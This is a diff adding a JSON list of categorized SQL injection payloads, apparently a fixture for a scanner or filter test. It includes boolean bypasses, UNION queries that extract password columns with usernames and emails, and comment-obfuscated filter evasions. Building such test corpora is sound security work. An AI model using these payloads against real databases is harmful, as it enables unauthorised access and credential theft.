@@ -1,0 +1,15 @@
+[
+  {"id": "SQLI-B01", "category": "boolean", "payload": "qqqq' OR '1'='1' --"},
+  {"id": "SQLI-B02", "category": "boolean", "payload": "qqqq' AND 1=1 OR 'a'='a' --"},
+  {"id": "SQLI-B03", "category": "boolean", "payload": "qqqq' OR 1=1 OR 'x'='x"},
+  {"id": "SQLI-U01", "category": "union", "payload": "qqqq' UNION SELECT id, {pwd}, email FROM {table} --"},
+  {"id": "SQLI-U02", "category": "union", "payload": "qqqq' uNioN sElEct id, {pwd}, email FROM {table} -- "},
+  {"id": "SQLI-U03", "category": "union", "payload": "qqqq'/**/UNION/**/SELECT/**/id,{pwd},email/**/FROM/**/{table}--"},
+  {"id": "SQLI-U04", "category": "union", "payload": "qqqq' UNION SELECT id, username||':'||{pwd}, email FROM {table} --"},
+  {"id": "SQLI-C01", "category": "comment", "payload": "qqqq' OR 1=1--"},
+  {"id": "SQLI-C02", "category": "comment", "payload": "qqqq'#"},
+  {"id": "SQLI-E01", "category": "error", "payload": "qqqq'"},
+  {"id": "SQLI-E02", "category": "error", "payload": "qqqq\""},
+  {"id": "SQLI-F01", "category": "filter-bypass", "payload": "qqqq' OR/**/1=1--"},
+  {"id": "SQLI-N01", "category": "numeric", "payload": "qqqq' OR LENGTH(username)>0 --"}
+]
